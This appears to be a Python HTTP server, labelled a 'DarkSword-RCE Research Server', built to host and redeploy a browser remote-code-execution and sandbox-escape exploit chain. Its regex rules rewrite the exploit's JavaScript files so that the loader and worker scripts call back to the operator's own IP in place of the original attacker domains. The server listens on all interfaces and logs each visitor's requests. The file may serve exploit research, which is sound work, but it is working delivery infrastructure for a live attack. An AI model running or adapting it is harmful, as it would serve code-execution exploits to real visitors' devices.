import os
import re
import io
import urllib.parse
import http.server
import socketserver
from datetime import datetime
from pathlib import Path

# ─── Config ───────────────────────────────────────────────
BASE_DIR  = Path(__file__).parent.resolve()
LOGS_DIR  = BASE_DIR / "logs"
PORT      = 8080
BIND      = "0.0.0.0"
LOCAL_IP  = ""   # auto-detected at startup

# ─── Dynamic Patches ──────────────────────────────────────
#
# Strategy: target NAMED VARIABLES and STRUCTURAL PATTERNS rather than
# matching arbitrary IPs/domains.  This makes every patch idempotent —
# it works correctly whether the file on disk still contains the original
# domain, a previously injected IP, or any other value, because we anchor
# the regex to the surrounding JS syntax, not to a specific old value.
#
# Each tuple is (regex_pattern, replacement_template).
# {IP} and {PORT} in the replacement are expanded at request time.
#
DYNAMIC_PATCHES = [

    # ── 1. rce_loader.js — localHost variable ─────────────────────────────
    # Targets: var localHost = "http://anything"  (any prior value)
    (
        r'(var\s+localHost\s*=\s*)["\']https?://[^"\']*["\']',
        r'\g<1>"http://{IP}:{PORT}"',
    ),

    # ── 2. Any other top-level server-URL variable (future-proof) ─────────
    # Covers:  var/let/const  serverHost / SERVER_HOST / serverUrl = "..."
    (
        r'((?:var|let|const)\s+(?:serverHost|SERVER_HOST|serverUrl|SERVER_URL)\s*=\s*)'
        r'["\']https?://[^"\']*["\']',
        r'\g<1>"http://{IP}:{PORT}"',
    ),

    # ── 3. logurlprefix bare variable declaration ──────────────────────────
    # Workers declare this as a string that was once a full URL.
    # Keep it empty — workers derive the actual host from data.desiredHost.
    (
        r'((?:var|let|const)\s+logurlprefix\s*=\s*)["\'][^"\']*["\']',
        r'\g<1>""',
    ),

    # ── 4. Any remaining full exploit-server URL literal (belt-and-suspenders)
    # Catches the ORIGINAL CDN domain OR any IP:PORT that was previously
    # substituted.  Anchored to http:// so it will NEVER match raw memory
    # addresses, hex values, or other numeric IPs in the exploit logic.
    (
        r'(?:https?://static\.cdncounter\.net(?:/[^\s"\']*)?'
        r'|http://(?:\d{1,3}\.){3}\d{1,3}:\d+)',
        r'http://{IP}:{PORT}',
    ),

    # ── 5. sqwas.shapelie.com — bare hostname used in some build variants ──
    (
        r'sqwas\.shapelie\.com',
        r'{IP}',
    ),

    # ── 6. Hard-coded 404 redirect to original exploit domain ─────────────
    (
        r'window\.location\.href\s*=\s*["\']https://static\.cdncounter\.net/404\.html["\']',
        r'window.location.href = "https://www.google.com"',
    ),

    # ── 7. LOG() function guard — sbx0/sbx1 main scripts ─────────────────
    # Prevents double-wrapping if the file has already been patched once.
    (
        r'function LOG\(msg\)\s*\{(?!\s*if\s*\(typeof)',
        r'function LOG(msg) { if(typeof print!=="undefined") print("sbx0: "+msg); return; ',
    ),
]

SYMLINKS = {"rce_worker_18.4.js": "rce_worker.js"}

# ─── Helpers ──────────────────────────────────────────────
def get_local_ip():
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"

def make_symlinks():
    for link_name, target in SYMLINKS.items():
        link = BASE_DIR / link_name
        tgt  = BASE_DIR / target
        if not link.exists() and tgt.exists():
            link.symlink_to(target)
            print(f"  [✓] Symlink: {link_name} → {target}")
        elif link.exists():
            print(f"  [~] Symlink exists: {link_name}")
        else:
            print(f"  [!] Target missing for symlink: {target}")

def apply_patches(content: str) -> tuple[str, int]:
    """Apply all DYNAMIC_PATCHES and return (patched_content, total_substitutions)."""
    total = 0
    for pat, repl in DYNAMIC_PATCHES:
        repl_str = repl.replace("{IP}", LOCAL_IP).replace("{PORT}", str(PORT))
        content, n = re.subn(pat, repl_str, content)
        total += n
    return content, total

# ─── Reusable TCP Server ───────────────────────────────────
class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

# ─── Logging HTTP Handler ──────────────────────────────────
class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    log_file = None

    def send_head(self):
        """Intercept GET requests to dynamically patch .html and .js files."""
        path = self.translate_path(self.path)

        # Directory handling (redirect / serve index)
        if os.path.isdir(path):
            parts = urllib.parse.urlsplit(self.path)
            if not parts.path.endswith("/"):
                self.send_response(301)
                self.send_header("Location", self.path + "/")
                self.end_headers()
                return None
            for index in ["index.html", "index.htm"]:
                index_path = os.path.join(path, index)
                if os.path.exists(index_path):
                    path = index_path
                    break
            else:
                return super().send_head()

        # Only patch text-based exploit files
        if not path.endswith((".html", ".js")):
            return super().send_head()

        try:
            with open(path, "rb") as fd:
                content = fd.read().decode("utf-8", errors="replace")

            patched, n_subs = apply_patches(content)

            if n_subs:
                fname = os.path.basename(path)
                print(f"  [patch] {fname}: {n_subs} substitution(s) applied")

            body = patched.encode("utf-8")
            f = io.BytesIO(body)

            self.send_response(200)
            self.send_header("Content-type", self.guess_type(path))
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Last-Modified", self.date_time_string())
            self.end_headers()
            return f

        except OSError:
            self.send_error(404, "File not found")
            return None
        except Exception as e:
            print(f"\n[!] Error processing {path}: {e}")
            self.send_error(500, "Server Error")
            return None

    def handle(self):
        try:
            super().handle()
        except (BrokenPipeError, ConnectionResetError):
            pass

    def log_message(self, fmt, *args):
        raw     = fmt % args
        line    = f"{self.client_address[0]} - [{self.log_date_time_string()}] {raw}\n"
        decoded = urllib.parse.unquote(line)
        print(decoded, end="", flush=True)
        if LoggingHandler.log_file:
            LoggingHandler.log_file.write(decoded)
            LoggingHandler.log_file.flush()

    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        super().end_headers()

# ─── Main ──────────────────────────────────────────────────
def main():
    global LOCAL_IP
    LOCAL_IP = get_local_ip()

    print("=" * 55)
    print("  DarkSword-RCE Research Server")
    print("=" * 55)
    print(f"  Base dir : {BASE_DIR}")
    print(f"  Local IP : {LOCAL_IP}")
    print(f"  Port     : {PORT}")
    print()

    # 1) Logs
    LOGS_DIR.mkdir(exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = LOGS_DIR / f"exploit_{ts}.log"
    LoggingHandler.log_file = open(log_path, "a")
    print(f"  [*] Logging to: {log_path}")
    print()

    # 2) Patch summary
    print(f"  [*] Dynamic patching active ({len(DYNAMIC_PATCHES)} rules)")
    print( "      Patches target named JS variables/fields — IP-agnostic.")
    print()

    # 3) Symlinks
    print("  [*] Creating symlinks ...")
    make_symlinks()
    print()

    # 4) Serve
    os.chdir(BASE_DIR)
    print(f"  [*] Starting HTTP server → http://{LOCAL_IP}:{PORT}/frame.html")
    print("      Press Ctrl+C to stop.\n")

    with ReusableTCPServer((BIND, PORT), LoggingHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n  [*] Server stopped.")
            LoggingHandler.log_file.close()

if __name__ == "__main__":
    main()